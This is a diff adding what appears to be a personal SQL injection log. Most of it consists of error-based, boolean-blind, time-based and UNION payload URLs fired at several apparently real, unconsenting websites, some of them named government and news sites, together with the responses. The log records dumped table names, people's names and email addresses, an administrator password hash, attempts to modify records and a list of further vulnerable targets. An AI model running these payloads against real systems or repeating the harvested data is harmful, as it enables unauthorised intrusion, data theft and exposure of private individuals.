@@ -1,0 +1,571 @@
+ 
+Error: SELECT * FROM `category` WHERE is_active='1' AND id =200\'
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
+
+comments can be done using below, 
+limitation is need an extra space after -- or # sign 
+Eg. --%20  (where %20 is for space) and #%23 
+
+-- double dash
+# hash
+$ pound 
+/*  */ 
+
+http://www.tunesoman.com/product.php?id=200%20order%20by%201
+
+'  \'   ' 
+'   \' order by 1\'   
+
+http://www.tunesoman.com/product.php?id=200 order by 1 --+
+
+
+Error: SELECT * FROM `category` WHERE is_active='1' AND id =200 order by 13
+
+Unknown column '13' in 'order clause' 
+
+http://www.tunesoman.com/product.php?id=200 OR union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14
+
+Error: SELECT * FROM `products` WHERE is_active='1' AND id =200 union select 1,2,3,4,5,6,7,8,9,10,11,12
+
+The used SELECT statements have a different number of columns
+
+Error: SELECT * FROM `category` WHERE is_active='1' AND id =1 order by 15
+
+Unknown column '15' in 'order clause'
+
+SELECT /*!32302 1/0, */ 1 FROM tablename
+SELECT /*!32302 1/0, */ 1 FROM category
+
+select count(*) from information_schema.tables
+select rand(*) from information_schema.tables
+
+select table_name,table_schema from information_schema.table group by table_schema
+select database();
+select (select database());
+select concat(select database());
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a) A;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2) A;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2) A from information_schema.column;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2) A from information_schema.tables;
+select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) A from information_schema.tables group by A;
+select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) A from information_schema.column group by A;
+select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) A from information_schema.column group by A;
+select count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)) A from information_schema.column group by A;
+select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,0),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A;
+select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,0),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A;
+
+
+AND (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A)B) --+
+
+AND (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A)B) --+
+AND (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users'),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A)B) --+
+in above immediate query users is table name, iterate Limit values to get the results
+
+select length(database())
+select sustr(database(),1,1)
+select ascii(sustr(database(),1,1))
+
+id=1' AND (ascii(substr(database(),1,1))) =98 --+
+id=1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1))) =98 --+
+
+select if((select database())='security',sleep(10),NULL)
+ and if((select database())='security',sleep(10),NULL) --+
+
+ AND if(select substr(table_name,1,1) from information_schema.tables where table_schema=database()limit 0,1)='e',sleep(10),null) --+
+ 
+ select * from users into outfile "/tmp/test.txt"
+ select * from users limit 0,1 into dumpfile "/tmp/test.txt"
+ select load_file ("/etc/pwasswd) into outfile ("/tmp/test2.txt")
+ 
+ ')) union select 1,2,3 into outfile "/var/www/sqli-labs/less:7/union.txt" --+
+')) union select 1,database(),version() into outfile "/var/www/sqli-labs/less:7/union2.txt" --+
+')) union select 1,table_name,3 from information_schema.tables  into outfile "/var/www/sqli-labs/less:7/union3.txt" --+
+')) union select 1,username,password from information_schema.tables  into outfile "/var/www/sqli-labs/less:7/union3.txt" --+
+
+  
+http://www.atrium.com.pk/Shopping.php?ID=1 --+
+http://www.atrium.com.pk/Shopping.php?ID=1'' AND Status=1' AND order by 1 --+
+ 'order by 11 --' AND Status=1' at line 1
+ near 'Status=1' AND order by 1 --' AND Status=1' at line 1
+ near 'order by 1 --' AND Status=1' at line 1
+ 
+ http://www.atrium.com.pk/Shopping.php?ID=1'' AND union select  1,2,3 --+
+ 
+ http://www.bpc.gov.bd/contactus.php?id=1
+ near ''1''' at line 1
+ ''1\'' at line 1
+ 
+http://www.bpc.gov.bd/contactus.php?id=1 AND order by 11 --+
+ 
+ 
+================================================================================================ 
+ http://www.romanianwriters.ro/s.php?id=1
+ http://www.romanianwriters.ro/s.php?id=1'
+ ''1'' LIMIT 1' at line 1
+ http://www.romanianwriters.ro/s.php?id=1
+ No error
+ http://www.romanianwriters.ro/s.php?id=1\
+  ''1\' LIMIT 1' at line 1
+ http://www.romanianwriters.ro/s.php?id=1' --
+ error
+ 
+ http://www.romanianwriters.ro/s.php?id=1' --%20
+ http://www.romanianwriters.ro/s.php?id=1' AND 1=1 --+
+ No error
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND 1=1 --%20
+ works, no error
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND 1=2 --%20
+ not worked, no results
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND order by 1 --+
+ Error
+ http://www.romanianwriters.ro/s.php?id=1' order by 1 --+
+ No error
+ http://www.romanianwriters.ro/s.php?id=1' order by 2 --+
+ No error
+ http://www.romanianwriters.ro/s.php?id=1' order by 3 --+
+ No error
+ http://www.romanianwriters.ro/s.php?id=1' order by 4 --+
+ Error-err fetch static page>Unknown column '4' in 'order clause'--->  so only 3 columns exists
+ 
+ http://www.romanianwriters.ro/s.php?id=1' union select 1,2,3 --+
+ Worked
+ http://www.romanianwriters.ro/s.php?id=1' union select version(),2,3 --+
+ http://www.romanianwriters.ro/s.php?id=1' union select 1,database(),3 --+
+ http://www.romanianwriters.ro/s.php?id=1' union select 1,2,database() --+
+  http://www.romanianwriters.ro/s.php?id=1' union select 1,user(),3 --+
+ 
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A)B) --+
+ http://www.romanianwriters.ro/s.php?id=1' select sustr(database(),1,1) --+
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND 'union all select NULL,NULL,database() --+
+ worked but output does not display on page
+ http://www.romanianwriters.ro/s.php?id=1' AND 'union all select NULL,NULL,version() --+
+ http://www.romanianwriters.ro/s.php?id=1' AND 'union all select NULL,NULL,database() into outfile 'c:/dbtest.txt'  --+
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),1,1))=114 --+
+ 
+ ===========================================================================================================================================
+ find length of database
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(length(database()))>6 --+
+ no
+ 
+ http://www.romanianwriters.ro/s.php?id=1' AND length(database())=12 --+
+ Database name has 12 characters
+ Database name -romanian_svc
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),1,1))-114 --+
+ r
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),2,1))-111 --+
+ o
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),3,1))=109 --+
+ m
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),4,1))=97 --+
+ a
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),5,1))=110 --+
+ n
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),6,1))=105 --+
+ i
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),7,1))=97 --+
+ a
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),8,1))=110 --+
+ n
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),9,1)) =95 --+
+ _
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),10,1)) =115 --+
+ s
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),11,1)) =118 --+
+ v
+ http://www.romanianwriters.ro/s.php?id=1' AND ascii(substr(database(),12,1)) =99 --+
+ c
+ 
+ http://www.sqlinjection.net/table-names/
+ 
+ Find Tble names
+ http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT table_schema,table_name,1 FROM information_schema.tables --+
+ CHARACTER_SETS
+1
+Image gallery:
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT table_schema,table_name,version() FROM information_schema.tables --+
+CHARACTER_SETS
+5.5.46-0ubuntu0.14.04.2
+Image gallery:
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT table_name,column_name,version() FROM information_schema.columns --+
+CHARACTER_SET_NAME
+5.5.46-0ubuntu0.14.04.2
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT CURRENT_USER(),table_name,CURRENT_USER() FROM information_schema.tables --+
+CHARACTER_SETS
+romanian_rowri@localhost
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT CURRENT_USER(),table_name,database() FROM information_schema.tables --+
+CHARACTER_SETS
+romanian_svc
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT 1, 2, @@version --+
+2
+5.5.46-0ubuntu0.14.04.2
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT 1, 2, database() --+
+romanian_svc
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT 1, 2, CURRENT_USER() --+
+romanian_rowri@localhost
+
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT NULL, NULL, CURRENT_USER() --+
+returned user
+
+http://www.romanianwriters.ro/s.php?id=1' AND sleep(10) --+
+waited for 10 sec and processed requests
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT 1, 2, 7 --+
+7
+http://www.romanianwriters.ro/s.php?id=1' AND UNION SELECT 1, 2, 7 --+
+Error
+http://www.romanianwriters.ro/s.php?id=-1' AND 1=2 UNION SELECT 1, 2, 7 --+
+7
+http://www.romanianwriters.ro/s.php?id=-1' AND 1=2 UNION SELECT 1, 2, group_concat(table_name) from information_schema.tables where table_schema=database() --+
+romanian_svc
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT 1, 2, @@HOSTNAME --+
+apache
+http://www.romanianwriters.ro/s.php?id=1' AND 1=2 UNION SELECT 1, 2, UUID() --+
+dd6ba651-8590-11e8-8726-8311c8b94737
+
+http://www.romanianwriters.ro/s.php?id=-1' AND  (SELECT 114 = ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema IN ('information_schema', 'mysql', 'test') LIMIT 1,1) --+
+returns false
+http://www.romanianwriters.ro/s.php?id=-1' AND  (SELECT 114 = ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema IN ('romanian_svc') LIMIT 1,1) --+
+http://www.romanianwriters.ro/s.php?id=-1' AND 1=2 UNION SELECT 1, database(),length(database()) --+
+12
+http://www.romanianwriters.ro/s.php?id=-1' AND 1=2 UNION SELECT 1, 2,length(database()) --+
+romanian_svc
+12
+http://www.romanianwriters.ro/s.php?id=-1' AND 1=2 UNION SELECT 1, @@datadir,length(database()) --+
+/var/lib/mysql/
+http://www.romanianwriters.ro/s.php?id=-1' union select 16,12,3 AND '1
+12
+1
+
+Need to check http://www.securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html
+Lecture 20 Blind injection Boolean Type               youtube
+ 
+ ==============================================================================
+ select count(*) from information_schema.tables;
+ select rand();
+ select floor(2.333);
+ select floor(rand()*2);
+ select table_name,table_schema from information_schema.tables group by table_schema;
+ select database();
+ select(select database());
+ select concat(0x3a0x3a,(select database()),0x3a,0x3a);
+ select concat(0x3a0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a;
+ select concat(0x3a0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;
+ select concat(0x3a0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables; 
+ select count(*), concat(0x3a0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;
+ select count(*), concat(0x3a0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
+ select count(*), concat(0x3a0x3a,(select version()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
+ select count(*), concat(0x3a0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
+ 
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+ 
+ output --> err fetch static page> romanian_svc::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+ 
+  output --> err fetch static page> 5.5.46-0ubuntu0.14.04.2::1' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ output --> err fetch static page> ra_carti::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_carti_autori::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_carti_critics::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 4,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_carti_pdf::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 5,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_contact::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 6,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_news::1' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 7,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_news_pics::1' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 8,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_sigle::0' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 9,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_statics::1' for key 'group_key'
+ 
+ http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 10,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+ err fetch static page> ra_statics_pics::0' for key 'group_key'
+ 
+ Database : romanian_svc
+ TABLES :ra_carti
+		ra_carti_autori
+		ra_carti_critics
+        ra_carti_pdf 
+		ra_contact
+		ra_news
+		ra_news_pics
+		ra_sigle
+		ra_statics
+		ra_statics_pics
+		
+ ra_contact:	nume  -->Lucian Dan
+				functie   ->Rights Manager,Editor
+				email   ->lucian.teodorovici@polirom.ro  ,  lucia.dos@polirom.ro
+				poza   --> null
+			
+==========================
+Identify the columns
+==========================		
+AND (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users'),0x3a,0x3a,floor(rand()*2) A from information_schema.column group by A)B) --+		
+http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+nume
+
+http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=database() limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+prenume
+
+http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=database() limit 3,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+autoportret
+
+http://www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=database() limit 4,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+biografie
+
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='ra_contact' limit 1,1),0x3a,0x3a,round(rand()*2,1))a from information_schema.columns group by a)b) --+
+ err fetch static page> nume::0.8' for key 'group_key'
+ 
+ www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='ra_contact' limit 2,1),0x3a,0x3a,round(rand()*2,1))a from information_schema.columns group by a)b) --+
+err fetch static page> functie::1.7' for key 'group_key'
+
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='ra_contact' limit 3,1),0x3a,0x3a,round(rand()*2,1))a from information_schema.columns group by a)b) --+
+err fetch static page> email::0.7' for key 'group_key'
+
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='ra_contact' limit 4,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page> poza::1' for key 'group_key'
+
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select email from 'ra_contact' limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page> lucia.dos@polirom.ro::0' for key 'group_key'
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select email from 'ra_contact' limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page> lucian.teodorovici@polirom.ro::1' for key 'group_key'
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select functie from ra_contact limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page> Editor::0' for key 'group_key'
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select functie from ra_contact limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page> Rights Manager::0' for key 'group_key'
+
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select nume from ra_contact limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page> Lucian Dan Teodorovici::0' for key 'group_key'
+
+www.romanianwriters.ro/s.php?id=-1' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select poza from ra_contact limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+err fetch static page>Duplicate entry '::::0' for key 'group_key'
+
+
+
+=================================
+Try to outfile
+=================================
+http://www.romanianwriters.ro/s.php?id=1' union select 1,2,3 into outfile "c:/test.txt" --+
+err fetch static page>Access denied for user 'romanian_rowri'@'localhost' (using password: YES)
+
+
+=================================
+insert values
+=================================
+ra_contact:	nume  -->Lucian Dan
+			functie   ->Rights Manager,Editor
+			email   ->lucian.teodorovici@polirom.ro  ,  lucia.dos@polirom.ro
+			poza   --> null
+insert into 'romanian_svc'.'ra_contact' (,nume,functie,email,poza) values('Lucian Dan1','Rights Manager,Editor2','lucian.teodorovici@polirom.ro',null)
+
+
+
+
+
+
+=================================================================================
+http://www.atrium.com.pk/Shopping.php?ID=1
+
+MYSQL
+ ''1'' AND Status=1' at line 1
+ '        '1\      ' AND Status=1' at line 1
+  ''1\' AND
+  ''1'' AND
+  '     '1'''    '
+   '      '1'      ' 
+  
+  
+  http://www.atrium.com.pk/Shopping.php?ID=1'' --+
+  query fixed
+  http://www.atrium.com.pk/Shopping.php?ID=1'' AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=database() limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
+
+http://www.ictet.org/list+member.php?id=-1  AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 4,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b)
+
+=====================================================
+Database Length
+http://www.ictet.org/list+member.php?id=1 AND length(database())=11
+ictetorg_db
+
+Database Name
+http://www.ictet.org/list+member.php?id=1 AND ascii(substr(database(),1,1))=105
+i
+http://www.ictet.org/list+member.php?id=1 AND ascii(substr(database(),2,1))=99
+c
+http://www.ictet.org/list+member.php?id=1 AND ascii(substr(database(),3,1))=116
+t
+http://www.ictet.org/list+member.php?id=1 AND ascii(substr(database(),4,1))=101
+e
+http://www.ictet.org/list+member.php?id=1 AND ascii(substr(database(),5,1))=116
+t
+http://www.ictet.org/list+member.php?id=1 AND ascii(substr(database(),6,1))=111
+o
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,database(),version()
+
+http://www.ictet.org/list+member.php?id=-1 AND /*!00000(select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 4,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b)*/
+
+http://www.ictet.org/list+member.php?id=-1 oR 1  worked
+http://www.ictet.org/list+member.php?id=-1 oR 1
+
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,select table_name from information_schema.tables where database()='ictetorg_db',version()
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select (table_name) from (information_schema.tables) where (table_schema=database())),version()
+Database query failed: Subquery returns more than 1 row
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select (table_name) from (information_schema.tables) where (table_schema=database()) limit 1,1)   ,3
+or below query also works fine, where information_schema.tables is filtered by developer
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select table_name from (information_schema.tables) where table_schema=database() limit 1,1),3
+
+dmp_categories - 3
+dmp_posts - 3
+docs
+download_categories - 3
+mailing_list - 3
+member_categories - 3
+members - 3
+news - 3
+partners - 3
+rss_sources - 3
+sponsors - 3
+survey_sources - 3
+users - 3
+vacancies - 3
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select column_name from (information_schema.columns) where table_schema=database() limit 1,1)   ,3
+title
+description
+date_posted  Last SQL query: SELECT * FROM members WHERE id=date_posted LIMIT 1
+id
+category 
+sub_category 
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select column_name from (information_schema.columns) limit 1,1),3
+DEFAULT_COLLATE_NAME - 3
+
+SELECT `COLUMN_NAME` 
+FROM `INFORMATION_SCHEMA`.`COLUMNS` 
+WHERE `TABLE_SCHEMA`='yourdatabasename' 
+    AND `TABLE_NAME`='yourtablename';
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select (SELECT column_name from (information_schema.columns) WHERE table_schema=database() AND table_name='users') limit 1,1),3
+
+http://www.ictet.org/list+member.php?id=-1 /*!00000uNion*/ select 1,(select column_name from (information_schema.columns) WHERE table_schema=%27ictetorg_db%27 AND table_name=(users) limit 1,1),3
+
+
+==========================================================
+http://www.northeastnews.in/news.php?id=17
+-------------------------------------
+Find number of referenced columns
+--------------------------------------
+http://www.northeastnews.in/news.php?id=17 order by 8 --+
+Error-  so we have 7 columns referencing in backend
+
+http://www.northeastnews.in/news.php?id=17 union select 1,2,3,4,5,6,7 --+
+
+
+http://www.northeastnews.in/news.php?id=17+and(select+1+from(select+count(*),concat(0x3a,(select+substr(group_concat(table_name),1,150)+from+information_schema.tables+where+table_schema=database()+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)z)--+-
+Duplicate entry ':counter,gcm_users,nen_about,nen_add,nen_category,nen_citizen,ne' for key ''
+
+http://www.northeastnews.in/news.php?id=17 +and+(select+length(concat(schema_name))+from+information_schema.schemata+limit+0,1)>17+ --+
+17 true
+ http://www.northeastnews.in/news.php?id=17 +and+ascii(subhash((select+concat(schema_name)+from+information_schema.schemata+limit+0,1),1,1))>64+ --+
+ FUNCTION db_northeast_news.subhash does not exist
+ 
+ http://www.northeastnews.in/news.php?id=17  AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b limit 1,1) --+
+  gcm_users 
+  nen_about 
+  nen_add 
+  nen_citizen 
+  nen_config 
+  nen_contact 
+  nen_content 
+  nen_correspondent 
+  nen_gmt 
+  nen_imagegallery 
+  nen_interview 
+  nen_login 
+  nen_nestatesinfo 
+  nen_news 
+  nen_noticeboard 
+  nen_readers 
+  nen_readersmail 
+  nen_slider 
+  nen_slidermsg 
+ 
+http://www.northeastnews.in/news.php?id=17 AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='gcm_users' limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b limit 1,1) --+
+ gcm_regid 
+ name
+ email 
+ created_at 
+
+ nen_login
+http://www.northeastnews.in/news.php?id=17 AND (select 1 from(select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='nen_login' limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b limit 1,1) --+
+ user_fullname
+ user_email 
+ user_password 
+ user_phone 
+ user_type 
+ user_status 
+ last_login 
+
+http://www.northeastnews.in/news.php?id=17 AND (select 1 from(select count(*), concat(0x3a,0x3a,(select name,created_at from gcm_users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b limit 1,1) --+
+ Empty values
+ 
+ http://www.northeastnews.in/news.php?id=17 AND (select 1 from(select count(*), concat(0x3a,0x3a,(select name from nen_contact limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b limit 1,1) --+
+ anup 
+ Anup Kumar 
+ 
+http://www.northeastnews.in/news.php?id=17  +and(select+1+from(select+count(*),concat(0x3a,(select+substr(group_concat(id,0x3a,name,0x3a,email),1,150)+from+db_northeast_news.nen_readersmail+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)z)--+
+2 Anup Kumar mr.anupkmr@gmail.com,4:PP SINGH:sainee@gmail.com,5' for key ''
+ 
+http://www.northeastnews.in/news.php?id=17  +and(select+1+from(select+count(*),concat(0x3a,(select+substr(group_concat(user_fullname,0x3a,user_password,0x3a,user_type,last_login,user_phone),1,150)+from+db_northeast_news.nen_login+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)z)--+
+Admin NEN:9699cd0b2bb8a0c795e7474aa49fbc28a445111c:admin2018-06' for key ''
+ 
+http://www.northeastnews.in/news.php?id=17 AND update nen_login set name='AnoopK' where name='Anup Kumar'
+ 
+ 
+ ============================================
+ MariaDB  http://www.atmarine.fi/index.php?id=2%27   http://www.dockguard.co.uk/page.php?id=18%27
+ MYSQL  http://www.bpc.gov.bd/contactus.php?id=13'
+ MYSQL  https://www.webscantest.com/datastore/search_get_by_id.php?id=4%27
+ Microsoft JET Database Engine      http://www.frasac.org.uk/login.asp?id=199%27
+
+ 
+============================================ 
+http://www.dockguard.co.uk/page.php?id=18%27
+http://www.dockguard.co.uk/page.php?id=-18' union select 1,2,3,version(),database(),6,7,8,9,10,11,12 --+
+web247-doc 
+  http://www.northeastnews.in/news.php?id=17  AND (select 1 from(select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b limit 1,1) --+
+
+ 
+ 
+ 
+ 
